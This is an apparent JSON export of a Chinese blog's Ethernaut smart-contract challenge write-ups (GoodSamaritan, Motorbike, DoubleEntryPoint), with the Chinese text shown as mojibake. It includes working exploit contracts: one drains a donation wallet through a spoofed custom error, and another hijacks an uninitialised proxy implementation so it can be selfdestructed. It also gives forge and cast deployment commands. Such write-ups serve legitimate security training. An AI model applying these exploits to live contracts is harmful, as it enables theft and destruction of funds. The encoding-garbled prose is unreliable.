è¿™é‡Œçš„åŠŸèƒ½transferå¾ˆé‡è¦ã€‚å®ƒæ­£åœ¨è¿›è¡Œå®šæœŸéªŒè¯ï¼Œå‡å°‘å‘ä»¶äººçš„é‡‘é¢å¹¶å¢åŠ ç›®çš„åœ°çš„é‡‘é¢ã€‚ä½†æ˜¯æœ‰ä¸€ä¸ªç‰¹åˆ«çš„éªŒè¯æ˜¯çªå‡ºçš„ - if(dest_.isContract())ã€‚è¿™æ˜¯æ£€æŸ¥è¯·æ±‚æèµ çš„åœ°å€æ˜¯å¦æ˜¯åˆçº¦ï¼Œå¹¶è°ƒç”¨notify()åœ°å€ä¸Šçš„å‡½æ•°ï¼Œå³dest_åˆçº¦ã€‚ç”±äºæˆ‘ä»¬æ§åˆ¶äº†è¯·æ±‚è€…åœ°å€ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨è¯¥åœ°å€ä¸Šåˆ›å»ºä¸€ä¸ªåˆçº¦ï¼Œå¹¶å¯èƒ½åœ¨è°ƒç”¨ä¹‹åæ§åˆ¶æ‰§è¡Œæµç¨‹INotifyable(dest_).notify(amount_)ã€‚ GoodSamaritan123456789101112131415161718192021222324contract GoodSamaritan &#123; Wallet public wallet; Coin public coin; constructor() &#123; wallet = new Wallet(); coin = new Coin(address(wallet)); wallet.setCoin(coin); &#125; function requestDonation() external returns(bool enoughBalance)&#123; // donate 10 coins to requester try wallet.donate10(msg.sender) &#123; return true; &#125; catch (bytes memory err) &#123; if (keccak256(abi.encodeWithSignature(&quot;NotEnoughBalance()&quot;)) == keccak256(err)) &#123; // send the coins left wallet.transferRemainder(msg.sender); return false; &#125; &#125; &#125;&#125; è¯¥åˆçº¦æ­£åœ¨éƒ¨ç½²Walletå’ŒCoinåˆçº¦çš„æ–°å®ä¾‹ã€‚ è¿™é‡Œçš„åŠŸèƒ½ 1requestDonation() å¾ˆæœ‰è¶£ã€‚æˆ‘ä»¬å¯ä»¥åœ¨å¤–éƒ¨è°ƒç”¨è¿™ä¸ªå‡½æ•°ã€‚è¯·æ³¨æ„ï¼Œè¿™æ•´ä»¶äº‹éƒ½åœ¨ä¸€ä¸ª 1try and 1catch å—ä¸­ã€‚ è¯¥tryå—æ­£åœ¨ä¸è°ƒç”¨è¯¥å‡½æ•°çš„ä»»ä½•äºº wallet.donate10(msg.sender)ä¸€èµ·æ‰§è¡Œè°ƒç”¨ã€‚msg.sender è¯¥catchå—æ­£åœ¨éªŒè¯ç”±äºè¯¥å—çš„é”™è¯¯è€ŒæŠ›å‡ºçš„é”™è¯¯æ˜¯å¦tryä¸è‡ªå®šä¹‰é”™è¯¯æ¶ˆæ¯çš„å­—ç¬¦ä¸²ç›¸åŒ¹é…NotEnoughBalance()ã€‚å¦‚æœåŒ¹é…ï¼Œåˆ™é’±åŒ…ä¼šå°†æ‰€æœ‰é‡‘é¢è½¬ç§»ç»™æˆ‘ä»¬ã€‚è¿™å°±æ˜¯æˆ‘ä»¬éœ€è¦å®ç°çš„ç›®æ ‡ã€‚ æ”»å‡»æµç¨‹è®©æˆ‘ä»¬é€€åå‡ æ­¥ï¼Œè·Ÿè¸ªè°ƒç”¨è¯¥requestDonation()å‡½æ•°æ—¶å‘ç”Ÿäº†ä»€ä¹ˆï¼š æˆ‘ä»¬è°ƒç”¨äº†requestDonation()ï¼Œæ‰§è¡Œæµç¨‹è½¬åˆ°äº†wallet.donate10(msg.sender)ã€‚ coin.transfer()å¦‚æœä¸€åˆ‡é¡ºåˆ©ï¼Œé’±åŒ…åˆçº¦å°±ä¼šè°ƒç”¨ã€‚ è¯¥coin.transfer()å‡½æ•°è¿›è¡Œå¿…è¦çš„è®¡ç®—ï¼Œæ£€æŸ¥æˆ‘ä»¬çš„åœ°å€æ˜¯å¦æ˜¯ä¸€ä¸ªåˆçº¦ï¼Œç„¶ånotify()åœ¨æˆ‘ä»¬çš„åœ°å€ä¸Šè°ƒç”¨ä¸€ä¸ªå‡½æ•°ã€‚ è¿™æ˜¯æˆ‘ä»¬è¿›æ”»çš„åœ°æ–¹ã€‚æˆ‘ä»¬notify()åœ¨æˆ‘ä»¬çš„åˆçº¦ä¸­åˆ›å»ºä¸€ä¸ªå‡½æ•°ï¼Œå¹¶è®©å®ƒæ¢å¤ä¸€ä¸ªåä¸º çš„è‡ªå®šä¹‰é”™è¯¯NotEnoughBalance()ã€‚è¿™å°†è§¦å‘å‡½æ•°ä¸­çš„é”™è¯¯GoodSamaritan.requestDonation()ï¼Œå¹¶ä¸”catch()å°†è§¦å‘å—å‘æˆ‘ä»¬è½¬ç§»æ‰€æœ‰ä»¤ç‰Œã€‚ ä½†æ˜¯ç­‰ç­‰ï¼Œè¿˜æœ‰å¦ä¸€ä¸ªé—®é¢˜ã€‚è½¬ç§»æ‰€æœ‰ä»£å¸æ˜¯è¡Œä¸é€šçš„ï¼Œå› ä¸ºæˆ‘ä»¬çš„åˆçº¦åªä¼šæ¢å¤äº¤æ˜“ã€‚ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œæˆ‘ä»¬éœ€è¦å‘æˆ‘ä»¬çš„notify()å‡½æ•°æ·»åŠ å¦ä¸€ä¸ªæ¡ä»¶æ¥æ£€æŸ¥æ˜¯å¦amount &lt;= 10ï¼Œç„¶ååªæ¢å¤ã€‚ åˆ©ç”¨ä¸‹é¢æ˜¯æˆ‘ä»¬çš„æ¼æ´åˆ©ç”¨ä»£ç çš„æ ·å­ï¼š 1234567891011121314151617181920// SPDX-License-Identifier: MITpragma solidity ^0.8.0;import &quot;../instances/Ilevel27.sol&quot;;contract BadSamaritan &#123; error NotEnoughBalance(); GoodSamaritan goodsamaritan = GoodSamaritan(0xcf2e93212faddDeB5ca99606104Be3Bae28e27A4); //ethernaut instance address function attax() external &#123; goodsamaritan.requestDonation(); &#125; function notify(uint256 amount) external pure &#123; if (amount &lt;= 10) &#123; revert NotEnoughBalance(); &#125; &#125;&#125; è¯¥attax()å‡½æ•°ä»…ç”¨äºè°ƒç”¨requestDonation()ä»¥è§¦å‘åˆå§‹ä¼ è¾“ã€‚ ç„¶åè½¬è´¦å°†è°ƒç”¨æˆ‘ä»¬çš„notify()å‡½æ•°ï¼Œå› ä¸ºé‡‘é¢ä¸º 10ï¼Œæ‰€ä»¥å®ƒä¼šæ¢å¤ã€‚ ç„¶åï¼Œè¿˜åŸå°†è§¦å‘åŒºå—catchå¹¶å°†requestDonation()æ‰€æœ‰ä»£å¸è½¬ç§»ç»™æˆ‘ä»¬ã€‚ è¿™æ¬¡æˆ‘ä»¬notify()ä¸ä¼šå› ifæ¡ä»¶è€Œæ¢å¤ã€‚ è®©æˆ‘ä»¬ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤éƒ¨ç½²æˆ‘ä»¬çš„åˆçº¦ï¼š 1forge create BadSamaritan --private-key $PKEY --rpc-url $RPC_URL ç°åœ¨è°ƒç”¨attax()å‡½æ•°ï¼š 1cast send 0xb5daE871ADAFD33ee4B6Bf782a30b238902715F6 &quot;attax()&quot; --private-key $PKEY --rpc-url $RPC_URL --gas-limit 1000000 æˆ‘æŒ‡å®šäº†ä¸€ä¸ªå¾ˆå¤§çš„ gas limitï¼Œå› ä¸ºäº¤æ˜“ä¸€ç›´å¤±è´¥ã€‚ ç°åœ¨å¯ä»¥æäº¤å®ä¾‹ä»¥å®Œæˆå…³å¡ã€‚ 3. è§£é¢˜","categories":[{"name":"Smart contracts","slug":"Smart-contracts","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/"},{"name":"ethernaut","slug":"Smart-contracts/ethernaut","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/ethernaut/"}],"tags":[{"name":"Solidity","slug":"Solidity","permalink":"https://biyouqiuqiu.com/tags/Solidity/"},{"name":"é¶åœº","slug":"é¶åœº","permalink":"https://biyouqiuqiu.com/tags/%E9%9D%B6%E5%9C%BA/"}]},{"title":"Motorbike","slug":"Smart contracts/ethernaut/Motorbike","date":"2023-03-13T04:23:10.000Z","updated":"2023-03-13T04:23:10.000Z","comments":true,"path":"2023/03/13/Smart contracts/ethernaut/Motorbike/","link":"","permalink":"https://biyouqiuqiu.com/2023/03/13/Smart%20contracts/ethernaut/Motorbike/","excerpt":"","text":"Motorbike1. é¢˜ç›®è¦æ±‚ 1.1 Ethernaut çš„æ‘©æ‰˜è½¦é‡‡ç”¨å…¨æ–°çš„å¯å‡çº§å‘åŠ¨æœºè®¾è®¡ã€‚ ä½ èƒ½å¯åŠ¨selfdestructå®ƒçš„å¼•æ“å¹¶ä½¿æ‘©æ‰˜è½¦æ— æ³•ä½¿ç”¨å—ï¼Ÿ å¯èƒ½æœ‰å¸®åŠ©çš„äº‹æƒ…ï¼š EIP-1967 UUPSå¯å‡çº§æ¨¡å¼ å¯åˆå§‹åŒ–åˆçº¦ 1.2 é¢˜ç›®ä»£ç ï¼š // SPDX-License-Identifier: MIT pragma solidity &lt;0.7.0; import &quot;openzeppelin-contracts-06/utils/Address.sol&quot;; import &quot;openzeppelin-contracts-06/proxy/Initializable.sol&quot;; contract Motorbike &#123; // keccak-256 hash of &quot;eip1967.proxy.implementation&quot; subtracted by 1 bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc; struct AddressSlot &#123; address value; &#125; // Initializes the upgradeable proxy with an initial implementation specified by `_logic`. constructor(address _logic) public &#123; require(Address.isContract(_logic), &quot;ERC1967: new implementation is not a contract&quot;); _getAddressSlot(_IMPLEMENTATION_SLOT).value = _logic; (bool success,) = _logic.delegatecall( abi.encodeWithSignature(&quot;initialize()&quot;) ); require(success, &quot;Call failed&quot;); &#125; // Delegates the current call to `implementation`. function _delegate(address implementation) internal virtual &#123; // solhint-disable-next-line no-inline-assembly assembly &#123; calldatacopy(0, 0, calldatasize()) let result := delegatecall(gas(), implementation, 0, calldatasize(), 0, 0) returndatacopy(0, 0, returndatasize()) switch result case 0 &#123; revert(0, returndatasize()) &#125; default &#123; return(0, returndatasize()) &#125; &#125; &#125; // Fallback function that delegates calls to the address returned by `_implementation()`. // Will run if no other function in the contract matches the call data fallback () external payable virtual &#123; _delegate(_getAddressSlot(_IMPLEMENTATION_SLOT).value); &#125; // Returns an `AddressSlot` with member `value` located at `slot`. function _getAddressSlot(bytes32 slot) internal pure returns (AddressSlot storage r) &#123; assembly &#123; r_slot := slot &#125; &#125; &#125; contract Engine is Initializable &#123; // keccak-256 hash of &quot;eip1967.proxy.implementation&quot; subtracted by 1 bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc; address public upgrader; uint256 public horsePower; struct AddressSlot &#123; address value; &#125; function initialize() external initializer &#123; horsePower = 1000; upgrader = msg.sender; &#125; // Upgrade the implementation of the proxy to `newImplementation` // subsequently execute the function call function upgradeToAndCall(address newImplementation, bytes memory data) external payable &#123; _authorizeUpgrade(); _upgradeToAndCall(newImplementation, data); &#125; // Restrict to upgrader role function _authorizeUpgrade() internal view &#123; require(msg.sender == upgrader, &quot;Can&#39;t upgrade&quot;); &#125; // Perform implementation upgrade with security checks for UUPS proxies, and additional setup call. function _upgradeToAndCall( address newImplementation, bytes memory data ) internal &#123; // Initial upgrade and setup call _setImplementation(newImplementation); if (data.length &gt; 0) &#123; (bool success,) = newImplementation.delegatecall(data); require(success, &quot;Call failed&quot;); &#125; &#125; // Stores a new address in the EIP1967 implementation slot. function _setImplementation(address newImplementation) private &#123; require(Address.isContract(newImplementation), &quot;ERC1967: new implementation is not a contract&quot;); AddressSlot storage r; assembly &#123; r_slot := _IMPLEMENTATION_SLOT &#125; r.value = newImplementation; &#125; &#125; 12345678910111213141516171819## 2. åˆ†ææ­¤çº§åˆ«ä½¿ç”¨ç§°ä¸º[UUPS](https://forum.openzeppelin.com/t/uups-proxies-tutorial-solidity-javascript/7786)ï¼ˆé€šç”¨å¯å‡çº§ä»£ç†æ ‡å‡†ï¼‰çš„ä»£ç†æ¨¡å¼ã€‚[æˆ‘ä»¬åœ¨ç¬¬ 24 å±‚](https://blog.dixitaditya.com/ethernaut-level-24-puzzle-wallet)çœ‹åˆ°çš„æœ€åä¸€ä¸ªæ˜¯é€æ˜ä»£ç†æ¨¡å¼ã€‚ä¸åŒä¹‹å¤„åœ¨äºï¼Œåœ¨ UUPS ä»£ç†æ¨¡å¼ä¸­ï¼Œåˆçº¦å‡çº§é€»è¾‘ä¹Ÿå°†ç¼–ç åœ¨æ‰§è¡Œåˆçº¦ä¸­ï¼Œè€Œä¸æ˜¯ä»£ç†åˆçº¦ä¸­ã€‚è¿™å…è®¸ç”¨æˆ·èŠ‚çœä¸€äº›æ°”ä½“ã€‚è¿™æ˜¯ç»“æ„çš„æ ·å­ï¼š![å›¾ç‰‡.png](https://cdn.staticaly.com/gh/LBiyou/BlogImages@main/img/202306020024455.png)å¦ä¸€ä¸ªåŒºåˆ«æ˜¯ä»£ç†åˆçº¦ä¸­å®šä¹‰äº†ä¸€ä¸ªå­˜å‚¨æ§½ï¼Œç”¨äºå­˜å‚¨é€»è¾‘åˆçº¦çš„åœ°å€ã€‚æ¯æ¬¡å‡çº§é€»è¾‘åˆçº¦æ—¶éƒ½ä¼šæ›´æ–°ã€‚è¿™æ˜¯ä¸ºäº†é˜²æ­¢å­˜å‚¨å†²çªã€‚æœ‰å…³æ›´å¤šä¿¡æ¯ï¼Œè¯·å‚é˜…[EIP-1967](https://eips.ethereum.org/EIPS/eip-1967)ã€‚åœ¨æˆ‘ä»¬çš„ä¾‹å­ä¸­ï¼Œä»£ç†åˆçº¦æ˜¯æ‘©æ‰˜è½¦ï¼Œå®ç°/é€»è¾‘åˆçº¦æ˜¯å¼•æ“ã€‚å½“æˆ‘ä»¬æŸ¥çœ‹ä»£ç†åˆçº¦æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°å­˜å‚¨æ§½å®šä¹‰ä¸ºï¼šå¤åˆ¶```soliditybytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc; è¯¥æ’æ§½å­˜å‚¨æ‰§è¡Œåˆçº¦çš„åœ°å€ã€‚ selfdestruct()å½“æˆ‘ä»¬æŸ¥çœ‹ Engine åˆçº¦æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°åˆçº¦ä»£ç ä¸­æ²¡æœ‰å®šä¹‰ã€‚é‚£ä¹ˆæˆ‘ä»¬å°†å¦‚ä½•è°ƒç”¨å®ƒå‘¢ï¼Ÿæˆ‘ä»¬å°†å°è¯•å‡çº§å®æ–½åˆçº¦ä»¥å°†å…¶æŒ‡å‘æˆ‘ä»¬å·²éƒ¨ç½²çš„æ”»å‡»è€…åˆçº¦ã€‚ ä¸ºäº†å‡çº§é€»è¾‘ï¼Œå¼•æ“åˆçº¦å®šä¹‰äº†ä¸€ä¸ªåä¸ºçš„å‡½æ•°upgradeToAndCall()ï¼š å¤åˆ¶ 1234567function upgradeToAndCall(address newImplementation, bytes memory data) external payable &#123; _authorizeUpgrade(); _upgradeToAndCall(newImplementation, data);&#125;function _authorizeUpgrade() internal view &#123; require(msg.sender == upgrader, &quot;Can&#x27;t upgrade&quot;);&#125; è¿™æ˜¯ä¸ºäº†_authorizeUpgrade()æ£€æŸ¥æ˜¯å¦msg.senderæ˜¯upgrader. å› æ­¤ï¼Œè¦å‡çº§åˆçº¦ï¼Œæˆ‘ä»¬éœ€è¦ç¡®ä¿æˆ‘ä»¬æ˜¯upgrader. é‚£ä¹ˆæˆ‘ä»¬å¦‚ä½•æˆä¸ºå‡çº§è€…å‘¢ï¼Ÿæˆ‘ä»¬æ¥çœ‹ä¸€ä¸‹å‡½æ•°initialize()ï¼š å¤åˆ¶ 1234function initialize() external initializer &#123; horsePower = 1000; upgrader = msg.sender;&#125; initialize()æ˜¯åŸºäº UUPS çš„åˆçº¦ä¸­ä½¿ç”¨çš„ç‰¹æ®Šå‡½æ•°ã€‚å¹¶ä¸”ï¼Œä¸initializerä¿®é¥°ç¬¦ä¸€èµ·ï¼Œå®ƒå……å½“åªèƒ½è°ƒç”¨ä¸€æ¬¡çš„æ„é€ å‡½æ•°ã€‚ï¼ˆè¿™åœ¨ä¿®æ”¹å™¨ä¸­æ£€æŸ¥initializerï¼‰ã€‚ è¿™é‡Œåº”è¯¥æ³¨æ„çš„æ˜¯ï¼Œåœ¨æ­¤å®ç°ä¸­ï¼Œè¯¥initialize()å‡½æ•°åº”è¯¥ç”±å®ƒæ­£åœ¨æ‰§è¡Œçš„ä»£ç†åˆçº¦è°ƒç”¨ã€‚ä½ å¯ä»¥åœ¨å®ƒçš„æ„é€ å‡½æ•°ä¸­çœ‹åˆ°ã€‚ä½†è¯·è®°ä½ï¼Œå®ƒæ˜¯ä½¿ç”¨delegatecall(). å½“è°ƒç”¨è€…åˆçº¦å¯¹å¦ä¸€ä¸ªåˆçº¦è¿›è¡Œå§”æ‰˜è°ƒç”¨æ—¶ï¼Œè°ƒç”¨è€…åˆçº¦çš„å­˜å‚¨æ§½å°†ä½¿ç”¨é€»è¾‘åˆçº¦çš„ä»£ç è¿›è¡Œæ›´æ–°ã€‚ è¿™æ„å‘³ç€è¿™delegatecall()æ˜¯åœ¨ä»£ç†åˆçº¦çš„ä¸Šä¸‹æ–‡ä¸­è¿›è¡Œçš„ï¼Œè€Œä¸æ˜¯åœ¨å®ç°ä¸­è¿›è¡Œçš„ã€‚ æ‰€ä»¥ä»£ç†åˆçº¦åªèƒ½è°ƒç”¨initialize()ä¸€æ¬¡å¹¶ä¸”å®ƒä¼šæ›´æ–°å®ƒçš„å­˜å‚¨å€¼æ˜¯ç»å¯¹æ­£ç¡®çš„ï¼Œä½†æ˜¯å¦‚æœæˆ‘ä»¬è¦æ‰¾åˆ°å®æ–½åˆçº¦çš„éƒ¨ç½²åœ°å€å¹¶initialize()æ‰‹åŠ¨è°ƒç”¨å‘¢ï¼Ÿåœ¨æ‰§è¡ŒåˆåŒçš„ä¸Šä¸‹æ–‡ä¸­ï¼Œè¿™è¿˜æ²¡æœ‰è¢«è°ƒç”¨ã€‚å› æ­¤ï¼Œå¦‚æœæˆ‘ä»¬è¦è°ƒç”¨è¯¥å‡½æ•°ï¼Œæˆ‘ä»¬çš„ç”¨æˆ· ( msg.sender) å°†æˆä¸ºå‡çº§è€…ã€‚ ä¸€æ—¦æˆ‘ä»¬æˆä¸ºäº†ï¼Œupgraderæˆ‘ä»¬å°±å¯ä»¥è°ƒç”¨upgradeToAndCall()æˆ‘ä»¬è‡ªå·±çš„åˆçº¦åœ°å€ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨å…¶ä¸­åˆ›å»ºä¸€ä¸ªselfdestruct()å‡½æ•°ã€‚è¿™åº”è¯¥è¶³ä»¥è§£å†³æ°´å¹³ã€‚ åˆ©ç”¨è®©æˆ‘ä»¬é¦–å…ˆåˆ›å»ºæˆ‘ä»¬çš„æ”»å‡»è€…åˆçº¦ï¼Œå®ƒå°†åŒ…å«selfdestruct()å‡½æ•°ï¼š å¤åˆ¶ 12345678// SPDX-License-Identifier: MITpragma solidity ^0.6.0;contract Destructive &#123; function killed() external &#123; selfdestruct(address(0)); &#125; &#125; selfdestruct()åªæ˜¯ä¸€ä¸ªåœ¨å¤–éƒ¨å‡½æ•°ä¸­è¢«è°ƒç”¨çš„ç®€å•åˆåŒkilled()ã€‚ è¿™æ˜¯æˆ‘ä»¬çš„æ¼æ´åˆ©ç”¨è„šæœ¬çš„æ ·å­ï¼š å¤åˆ¶ 123456789101112131415161718192021// SPDX-License-Identifier: MITpragma solidity ^0.6.0;import &quot;forge-std/Script.sol&quot;;import &quot;../instances/Ilevel25.sol&quot;;contract POC is Script &#123; Motorbike level25 = Motorbike(0xE7BaFbC26565E1047d1755B820Fa99Fb463a5BF4); Engine engineAddress = Engine(address(uint160(uint256(vm.load(address(level25), 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc))))); function run() external&#123; vm.startBroadcast(); engineAddress.initialize(); console.log(&quot;Upgrader is :&quot;, engineAddress.upgrader()); bytes memory encodedData = abi.encodeWithSignature(&quot;killed()&quot;); engineAddress.upgradeToAndCall(0x04dE0eA8556C85b94E61bC83B43d4FFb6DdC30F1, encodedData); vm.stopBroadcast(); &#125;&#125; Motorbike level25- è¿™æ˜¯ä»£ç†åˆçº¦ Motorbike çš„åœ°å€ã€‚ Engine engineAddress 123\\- è¿™åŒ…å«å¼•æ“çš„åœ°å€ï¼Œä½¿ç”¨ vm.load(contract_address, slot_no) 123. ç”±äºè¿™ä¼šè¿”å›ä¸€ä¸ª bytes32 123å€¼ï¼Œåœ°å€æ˜¯20ä¸ªå­—èŠ‚ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦å°†å®ƒè½¬æ¢ä¸ºä¸€ä¸ªåœ°å€ç±»å‹çš„å˜é‡ã€‚ address(uint160(uint256())) 12345è¿™å°±æ˜¯ä¸ºä»€ä¹ˆè¦ä½¿ç”¨é¢å¤–çš„ã€‚è¿™ä¹Ÿå¯ä»¥ä»æ§åˆ¶å°ä½¿ç”¨å¤åˆ¶ await web3.eth.getStorageAt(contract.address, &#39;0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc&#39;) 123456789101112131415- `engineAddress.initialize()`- æˆ‘ä»¬æ­£åœ¨è°ƒç”¨è¯¥`initialize()`å‡½æ•°ä»¥æˆä¸ºå‡çº§ç¨‹åºã€‚- `console.log`- å®ƒåªæ˜¯ç”¨æ¥é€šè¿‡å°†åœ°å€è®°å½•åˆ°æ§åˆ¶å°æ¥ç¡®ä¿æˆ‘ä»¬æˆä¸ºå‡çº§è€…ã€‚- `bytes memory encodedData`- è¿™æ˜¯å°†åœ¨æ–¹æ³•å†…éƒ¨å‘é€çš„æ•°æ®`upgradeToAndCall()`ã€‚- `engineAddress.upgradeToAndCall`- æœ€åï¼Œæˆ‘ä»¬æ­£åœ¨è°ƒç”¨å‡çº§å®æ–½åˆåŒã€‚è¯¥å‡½æ•°æœŸæœ›å®ç°çš„åœ°å€ä½œä¸ºç¬¬ä¸€ä¸ªå‚æ•°ï¼ŒåŒ…å«å‡½æ•°ç­¾åçš„ç¼–ç æ•°æ®ä½œä¸ºç¬¬äºŒä¸ªå‚æ•°åœ¨å‡çº§åˆçº¦æ—¶è°ƒç”¨ã€‚è°ƒç”¨å®Œæˆåï¼Œå®æ–½åˆçº¦å°†æ›´æ”¹ä¸ºæˆ‘ä»¬å·²éƒ¨ç½²çš„`Destructive`åˆçº¦ï¼Œå½“å‰å®æ–½å°†å¯¹`delegatecall()`æˆ‘ä»¬çš„åˆçº¦`killed()`åŠŸèƒ½äº§ç”Ÿå½±å“ï¼Œä»è€Œç ´ååˆçº¦ã€‚éƒ¨ç½²ç ´åæ€§åˆçº¦å¹¶ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æ‰§è¡Œè„šæœ¬ï¼šå¤åˆ¶ forge create Destructive --private-key $PKEY --rpc-url $RPC_URL forge script ./script/level25.sol --private-key $PKEY --broadcast --rpc-url $RPC_URL -vvvv &gt; ç¡®ä¿åœ¨æ¼æ´åˆ©ç”¨è„šæœ¬ä¸­æ›´æ–°ç ´åæ€§åˆçº¦çš„åœ°å€ã€‚ ç°åœ¨å¯ä»¥æäº¤å®ä¾‹ä»¥å®Œæˆå…³å¡ã€‚ ## 3. è§£é¢˜","categories":[{"name":"Smart contracts","slug":"Smart-contracts","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/"},{"name":"ethernaut","slug":"Smart-contracts/ethernaut","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/ethernaut/"}],"tags":[{"name":"Solidity","slug":"Solidity","permalink":"https://biyouqiuqiu.com/tags/Solidity/"},{"name":"é¶åœº","slug":"é¶åœº","permalink":"https://biyouqiuqiu.com/tags/%E9%9D%B6%E5%9C%BA/"}]},{"title":"DoubleEntryPoint","slug":"Smart contracts/ethernaut/DoubleEntryPoint","date":"2023-03-13T04:20:10.000Z","updated":"2023-03-13T04:20:10.000Z","comments":true,"path":"2023/03/13/Smart contracts/ethernaut/DoubleEntryPoint/","link":"","permalink":"https://biyouqiuqiu.com/2023/03/13/Smart%20contracts/ethernaut/DoubleEntryPoint/","excerpt":"","text":"DoubleEntryPoint1. é¢˜ç›®è¦æ±‚ 1.1 æ­¤çº§åˆ«å…·æœ‰CryptoVaultç‰¹æ®ŠåŠŸèƒ½ï¼ŒsweepTokenåŠŸèƒ½ã€‚è¿™æ˜¯ç”¨äºæ£€ç´¢å¡åœ¨åˆçº¦ä¸­çš„ä»£å¸çš„å¸¸ç”¨å‡½æ•°ã€‚æ“ä½œCryptoVaultä½¿ç”¨underlyingæ— æ³•æ¸…é™¤çš„ä»¤ç‰Œï¼Œå› ä¸ºå®ƒæ˜¯ . çš„é‡è¦æ ¸å¿ƒé€»è¾‘ç»„ä»¶CryptoVaultã€‚å¯ä»¥æ¸…é™¤ä»»ä½•å…¶ä»–ä»¤ç‰Œã€‚ åº•å±‚ä»£å¸æ˜¯åˆçº¦å®šä¹‰ä¸­å®æ–½çš„ DET ä»£å¸çš„ä¸€ä¸ªå®ä¾‹DoubleEntryPointï¼Œå¹¶CryptoVaultæŒæœ‰ 100 ä¸ªå•ä½ã€‚æ­¤å¤–ï¼ŒCryptoVaultè¿˜æ‹¥æœ‰ 100 ä¸ªLegacyToken LGTã€‚ åœ¨æ­¤çº§åˆ«ä¸­ï¼Œæ‚¨åº”è¯¥æ‰¾å‡ºé”™è¯¯æ‰€åœ¨CryptoVaultå¹¶é˜²æ­¢å®ƒè¢«è€—å°½ä»¤ç‰Œã€‚ è¯¥åˆçº¦å…·æœ‰Fortaåˆçº¦åŠŸèƒ½ï¼Œä»»ä½•ç”¨æˆ·éƒ½å¯ä»¥æ³¨å†Œè‡ªå·±çš„detection botåˆçº¦ã€‚Forta æ˜¯ä¸€ä¸ªå»ä¸­å¿ƒåŒ–çš„ã€åŸºäºç¤¾åŒºçš„ç›‘æ§ç½‘ç»œï¼Œç”¨äºå°½å¿«æ£€æµ‹ DeFiã€NFTã€æ²»ç†ã€æ¡¥æ¢å’Œå…¶ä»– Web3 ç³»ç»Ÿä¸Šçš„å¨èƒå’Œå¼‚å¸¸ã€‚ä½ çš„å·¥ä½œæ˜¯å®ç°ä¸€ä¸ªdetection botå¹¶åœ¨åˆçº¦ä¸­æ³¨å†Œå®ƒFortaã€‚æœºå™¨äººçš„å®æ–½å°†éœ€è¦å‘å‡ºæ­£ç¡®çš„è­¦æŠ¥ï¼Œä»¥é˜²æ­¢æ½œåœ¨çš„æ”»å‡»æˆ–æ¼æ´åˆ©ç”¨ã€‚ å¯èƒ½æœ‰å¸®åŠ©çš„äº‹æƒ…ï¼š åŒå…¥å£ç‚¹å¦‚ä½•ä¸ºä»£å¸åˆçº¦å·¥ä½œï¼Ÿ 1.2 é¢˜ç›®ä»£ç ï¼š // SPDX-License-Identifier: MIT pragma solidity ^0.8.0; import &quot;openzeppelin-contracts-08/access/Ownable.sol&quot;; import &quot;openzeppelin-contracts-08/token/ERC20/ERC20.sol&quot;; interface DelegateERC20 &#123; function delegateTransfer(address to, uint256 value, address origSender) external returns (bool); &#125; interface IDetectionBot &#123; function handleTransaction(address user, bytes calldata msgData) external; &#125; interface IForta &#123; function setDetectionBot(address detectionBotAddress) external; function notify(address user, bytes calldata msgData) external; function raiseAlert(address user) external; &#125; contract Forta is IForta &#123; mapping(address =&gt; IDetectionBot) public usersDetectionBots; mapping(address =&gt; uint256) public botRaisedAlerts; function setDetectionBot(address detectionBotAddress) external override &#123; usersDetectionBots[msg.sender] = IDetectionBot(detectionBotAddress); &#125; function notify(address user, bytes calldata msgData) external override &#123; if(address(usersDetectionBots[user]) == address(0)) return; try usersDetectionBots[user].handleTransaction(user, msgData) &#123; return; &#125; catch &#123;&#125; &#125; function raiseAlert(address user) external override &#123; if(address(usersDetectionBots[user]) != msg.sender) return; botRaisedAlerts[msg.sender] += 1; &#125; &#125; contract CryptoVault &#123; address public sweptTokensRecipient; IERC20 public underlying; constructor(address recipient) &#123; sweptTokensRecipient = recipient; &#125; function setUnderlying(address latestToken) public &#123; require(address(underlying) == address(0), &quot;Already set&quot;); underlying = IERC20(latestToken); &#125; /* ... */ function sweepToken(IERC20 token) public &#123; require(token != underlying, &quot;Can&#39;t transfer underlying token&quot;); token.transfer(sweptTokensRecipient, token.balanceOf(address(this))); &#125; &#125; contract LegacyToken is ERC20(&quot;LegacyToken&quot;, &quot;LGT&quot;), Ownable &#123; DelegateERC20 public delegate; function mint(address to, uint256 amount) public onlyOwner &#123; _mint(to, amount); &#125; function delegateToNewContract(DelegateERC20 newContract) public onlyOwner &#123; delegate = newContract; &#125; function transfer(address to, uint256 value) public override returns (bool) &#123; if (address(delegate) == address(0)) &#123; return super.transfer(to, value); &#125; else &#123; return delegate.delegateTransfer(to, value, msg.sender); &#125; &#125; &#125; contract DoubleEntryPoint is ERC20(&quot;DoubleEntryPointToken&quot;, &quot;DET&quot;), DelegateERC20, Ownable &#123; address public cryptoVault; address public player; address public delegatedFrom; Forta public forta; constructor(address legacyToken, address vaultAddress, address fortaAddress, address playerAddress) &#123; delegatedFrom = legacyToken; forta = Forta(fortaAddress); player = playerAddress; cryptoVault = vaultAddress; _mint(cryptoVault, 100 ether); &#125; modifier onlyDelegateFrom() &#123; require(msg.sender == delegatedFrom, &quot;Not legacy contract&quot;); _; &#125; modifier fortaNotify() &#123; address detectionBot = address(forta.usersDetectionBots(player)); // Cache old number of bot alerts uint256 previousValue = forta.botRaisedAlerts(detectionBot); // Notify Forta 